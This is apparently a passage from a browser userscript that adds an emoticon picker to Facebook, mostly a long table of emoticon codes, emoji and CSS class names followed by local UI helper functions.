// ==UserScript==
// @name            ICON อีโมชั่น FaceBook
// @description     All about Facebook By No Name
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "GruÃ±Ã³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "PingÃ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
	html += '<a class="navLink" title="Icon Facebook">'; // var navLink
